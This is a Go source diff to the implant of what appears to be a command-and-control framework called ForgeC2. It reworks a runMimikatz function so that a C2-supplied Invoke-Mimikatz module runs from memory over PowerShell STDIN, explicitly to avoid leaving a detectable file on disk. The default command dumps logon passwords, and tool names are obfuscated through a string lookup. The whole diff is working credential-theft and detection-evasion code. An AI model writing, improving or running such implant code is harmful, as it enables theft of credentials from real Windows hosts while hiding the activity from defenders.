@@ -228,9 +228,12 @@ Write-Output ($results -join [string]::NewLine());
 	return out, nil
 }
 
-// runMimikatz runs a mimikatz command via a local Invoke-Mimikatz.ps1 only.
-// Remote IEX download is disabled for OPSEC.
-// Prefer order: task-provided base64 module → next to implant → TEMP → APPDATA modules.
+// runMimikatz runs a mimikatz command via an Invoke-Mimikatz.ps1. Remote IEX
+// download is disabled for OPSEC. The C2-provided module (if any) is piped to
+// powershell over STDIN and invoked from memory — it is NEVER written to disk,
+// avoiding the high-IOC "%TEMP%\Invoke-Mimikatz.ps1" artifact. When no module
+// is supplied the agent looks for an operator-placed script on disk and
+// dot-sources it in place.
 func runMimikatz(command string, moduleB64 string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
@@ -239,38 +242,42 @@ func runMimikatz(command string, moduleB64 string) (string, error) {
 		command = s(SSekurlsaLogonpasswords)
 	}
 	scriptName := s(SInvokeMimikatz) + ".ps1"
-	localScript := filepath.Join(os.TempDir(), scriptName)
 
-	// Deploy module payload from C2 if provided
+	// C2-supplied module: run entirely from memory (no on-disk PS1).
 	if moduleB64 != "" {
 		raw, err := base64.StdEncoding.DecodeString(moduleB64)
-		if err == nil && len(raw) > 0 {
-			if err := os.WriteFile(localScript, raw, 0600); err != nil {
-				return "", fmt.Errorf("%s: failed to write module script: %w", s(SMimikatz), err)
-			}
+		if err != nil || len(raw) == 0 {
+			return "", fmt.Errorf("%s: invalid module payload", s(SMimikatz))
 		}
+		safeCmd := strings.ReplaceAll(command, "'", "''")
+		// The module source defines Invoke-Mimikatz; dot-source it from the
+		// piped script, then invoke the requested command.
+		script := string(raw) + "\n" + fmt.Sprintf("$m = '%s'; $r = %s -Command $m; Write-Output $r", safeCmd, s(SInvokeMimikatz))
+		out, err := runPowerShellStdin(script)
+		if err != nil {
+			return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
+		}
+		return out, nil
 	}
 
-	if _, err := os.Stat(localScript); err != nil {
-		candidates := []string{}
-		if exe, err := os.Executable(); err == nil {
-			candidates = append(candidates, filepath.Join(filepath.Dir(exe), scriptName))
+	// No module provided: look for an operator-placed script and run it in place.
+	var localScript string
+	candidates := []string{}
+	if exe, err := os.Executable(); err == nil {
+		candidates = append(candidates, filepath.Join(filepath.Dir(exe), scriptName))
+	}
+	if appData := os.Getenv("APPDATA"); appData != "" {
+		candidates = append(candidates, filepath.Join(appData, "ForgeC2", "modules", scriptName))
+	}
+	candidates = append(candidates, filepath.Join(os.TempDir(), scriptName))
+	for _, c := range candidates {
+		if _, err := os.Stat(c); err == nil {
+			localScript = c
+			break
 		}
-		if appData := os.Getenv("APPDATA"); appData != "" {
-			candidates = append(candidates, filepath.Join(appData, "ForgeC2", "modules", scriptName))
-		}
-		candidates = append(candidates, filepath.Join(os.TempDir(), scriptName))
-		found := false
-		for _, c := range candidates {
-			if _, err := os.Stat(c); err == nil {
-				localScript = c
-				found = true
-				break
-			}
-		}
-		if !found {
-			return "", fmt.Errorf("%s: local script not found (remote IEX disabled). Upload %s to server Modules store or place next to implant/TEMP. Command: %s", s(SMimikatz), scriptName, command)
-		}
+	}
+	if localScript == "" {
+		return "", fmt.Errorf("%s: local script not found (remote IEX disabled). Upload %s to server Modules store or place next to implant/TEMP. Command: %s", s(SMimikatz), scriptName, command)
 	}
 
 	// Escape single quotes in command for PowerShell single-quoted string
